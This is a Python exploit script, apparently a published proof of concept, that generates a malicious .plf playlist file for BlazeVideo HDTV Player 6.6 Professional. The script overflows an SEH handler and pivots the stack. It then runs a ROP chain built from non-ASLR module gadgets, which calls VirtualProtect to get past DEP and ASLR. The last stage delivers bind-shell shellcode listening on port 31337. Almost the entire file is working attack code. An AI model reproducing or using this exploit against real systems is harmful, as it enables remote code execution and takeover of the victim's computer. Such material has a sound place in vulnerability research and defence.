#Coded by CymonL33t
#Tested on Windows 10 Enterprise 64 bits
#DEP bypass with ROP and stack pivoting
#Since all the ROP gadget is used from below NON-ASLR application modules,this PoC also bypass ASLR.
#But you may need to fix stack pivot rop gadget due to stack alignment issues of different architecture and windows versions.
#Download the application via this link https://drive.google.com/open?id=1sw5AU08rW7aBLwu10CI-qLVhlYlT9vB_

#Non-ASLR application modules
'''
[BlazeHDTV.EXE] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\BlazeHDTV.EXE)
[Configuration.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\Configuration.dll)
[EPG.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\EPG.dll)
[MediaPlayerCtrl.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\MediaPlayerCtrl.dll)
[SkinScrollBar.Dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\SkinScrollBar.Dll)
[NetReg.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\NetReg.dll)
[VersionInfo.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\VersionInfo.dll)
[DTVDeviceManager.dll] (C:\Program Files (x86)\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional\DTVDeviceManager.dll)
'''

import struct
import sys

blaze_file = "blaze_dep.plf"


payload = struct.pack('<L', 0x61310eaf) * 218     # ADD ESP,28 # RETN    ** [DTVDeviceManager.dll]" 



#We don't need nseh
# SEH is for stack pivot to the area we control(In that area,the shellcode lands)
seh   = struct.pack('<L',0x6130566b)              # ADD ESP,0A24 # RETN 0x04    ** [DTVDeviceManager.dll] ** 

payload += seh


rop  = struct.pack('<L',0x6030116A) * 44         # RETN instruction from configuration.dll

#For ESI register
#Esi register contains Pointer to VirtualProtect function
rop+= struct.pack('<L', 0x6405347a)	 # POP EDX # RETN 	** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x10011108)	 # ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
rop+= struct.pack('<L', 0x64040183)      # POP EBX # RETN     ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x99A9FE7C)      # This value + the "ADD BYTE PTR DS:[EBX+C68B04C4],AL" instruction next == writable addr
rop+= struct.pack('<L', 0x6030b982) 	 # MOV EAX,DWORD PTR DS:[EDX] # ADD BYTE PTR DS:[EBX+C68B04C4],AL # POP ESI # RETN 0x04    ** {Configuration.dll]
rop+= struct.pack('<L', 0x41414141) 	 # Filler (compensate)
rop+= struct.pack('<L', 0x61642a55) 	 # PUSH EAX # POP ESI # RETN 4    ** [EPG.dll]
rop+= struct.pack('<L', 0x41414141)  	 # Filler (compensate)

#For EBP register
#EBP contains return pointer of VirtualProtect function(and this could be jmp esp or push esp , retn)
rop+= struct.pack('<L', 0x6403d1a6)	 # POP EBP # RETN [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x41414141)  	 # Filler (compensate)
rop+= struct.pack('<L', 0x6161055A)	 # & push esp #  ret 0c [EPG.dll]

#For EBX register
#EBX contains dwSize (now 0x501 value)
rop+= struct.pack('<L', 0x61323EA8) 	 # POP EAX # RETN    ** [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0xA139799D) 	 # This value will goes to eax and that value will be added to get 0x501 value by using next gadget.
rop+= struct.pack('<L', 0x640203fc) 	 # ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6163d37b) 	 # PUSH EAX # ADD AL,5E # POP EBX # RETN    ** [EPG.dll]


#For EDX register
#EDX contains lpNewProtect(0x40 read_write_execute value)
rop+= struct.pack('<L', 0x61626807) 	 # XOR EAX,EAX # RETN    ** [EPG.dll]
rop+= struct.pack('<L', 0x640203fc) 	 # ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6405347a) 	 # POP EDX # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0xA13974DC)	 # This value will goes to edx and that value will be added to get 0x40 value by using next gadget.
rop+= struct.pack('<L', 0x613107fb) 	 # ADD EDX,EAX # MOV EAX,EDX # RETN    ** [DTVDeviceManager.dll]

#For ECX register
#ECX contains lpfOldProtect(dummy writable address)
rop+= struct.pack('<L', 0x61601fc0)	 # POP ECX # RETN [EPG.dll]
rop+= struct.pack('<L', 0x60350340)	 # &Writable location [AviosoftDTV.exe]

#For EDI register
#EDI contains ROP NOP coz this retn value must points to VP function after VP is called and changed the permission of the stack.
rop+= struct.pack('<L', 0x61329e07)	 # POP EDI # RETN [DTVDeviceManager.dll] 
rop+= struct.pack('<L', 0x61326003)	 # RETN (ROP NOP) [DTVDeviceManager.dll]

#For Eax (NOP)
rop+= struct.pack('<L', 0x61606595)	 # POP EAX # RETN ** [EPG.dll] 
rop+= struct.pack('<L', 0x90909090)	 # nop


rop+= struct.pack('<L', 0x61620CF1)	 # PUSHAD # RETN [EPG.dll] 
NOP = "\x90" * 32


# windows/shell_bind_tcp - 368 bytes
# LPORT=31337,EXITFUNC=process 
shellcode = (
"\xdd\xc1\xd9\x74\x24\xf4\xbb\xc4\xaa\x69\x8a\x58\x33\xc9\xb1"
"\x56\x83\xe8\xfc\x31\x58\x14\x03\x58\xd0\x48\x9c\x76\x30\x05"
"\x5f\x87\xc0\x76\xe9\x62\xf1\xa4\x8d\xe7\xa3\x78\xc5\xaa\x4f"
"\xf2\x8b\x5e\xc4\x76\x04\x50\x6d\x3c\x72\x5f\x6e\xf0\xba\x33"
"\xac\x92\x46\x4e\xe0\x74\x76\x81\xf5\x75\xbf\xfc\xf5\x24\x68"
"\x8a\xa7\xd8\x1d\xce\x7b\xd8\xf1\x44\xc3\xa2\x74\x9a\xb7\x18"
"\x76\xcb\x67\x16\x30\xf3\x0c\x70\xe1\x02\xc1\x62\xdd\x4d\x6e"
"\x50\x95\x4f\xa6\xa8\x56\x7e\x86\x67\x69\x4e\x0b\x79\xad\x69"
"\xf3\x0c\xc5\x89\x8e\x16\x1e\xf3\x54\x92\x83\x53\x1f\x04\x60"
"\x65\xcc\xd3\xe3\x69\xb9\x90\xac\x6d\x3c\x74\xc7\x8a\xb5\x7b"
"\x08\x1b\x8d\x5f\x8c\x47\x56\xc1\x95\x2d\x39\xfe\xc6\x8a\xe6"
"\x5a\x8c\x39\xf3\xdd\xcf\x55\x30\xd0\xef\xa5\x5e\x63\x83\x97"
"\xc1\xdf\x0b\x94\x8a\xf9\xcc\xdb\xa1\xbe\x43\x22\x49\xbf\x4a"
"\xe1\x1d\xef\xe4\xc0\x1d\x64\xf5\xed\xc8\x2b\xa5\x41\xa2\x8b"
"\x15\x22\x12\x64\x7c\xad\x4d\x94\x7f\x67\xf8\x92\xb1\x53\xa9"
"\x74\xb0\x63\x37\xec\x3d\x85\xad\xfe\x6b\x1d\x59\x3d\x48\x96"
"\xfe\x3e\xba\x8a\x57\xa9\xf2\xc4\x6f\xd6\x02\xc3\xdc\x7b\xaa"
"\x84\x96\x97\x6f\xb4\xa9\xbd\xc7\xbf\x92\x56\x9d\xd1\x51\xc6"
"\xa2\xfb\x01\x6b\x30\x60\xd1\xe2\x29\x3f\x86\xa3\x9c\x36\x42"
"\x5e\x86\xe0\x70\xa3\x5e\xca\x30\x78\xa3\xd5\xb9\x0d\x9f\xf1"
"\xa9\xcb\x20\xbe\x9d\x83\x76\x68\x4b\x62\x21\xda\x25\x3c\x9e"
"\xb4\xa1\xb9\xec\x06\xb7\xc5\x38\xf1\x57\x77\x95\x44\x68\xb8"
"\x71\x41\x11\xa4\xe1\xae\xc8\x6c\x11\xe5\x50\xc4\xba\xa0\x01"
"\x54\xa7\x52\xfc\x9b\xde\xd0\xf4\x63\x25\xc8\x7d\x61\x61\x4e"
"\x6e\x1b\xfa\x3b\x90\x88\xfb\x69")
payload += rop + NOP + shellcode 
payload += "C" * (5000-len(payload))



file = open(blaze_file,'w')
file.write(payload)
file.close()

print "Successfully " + blaze_file + " Created!!!"
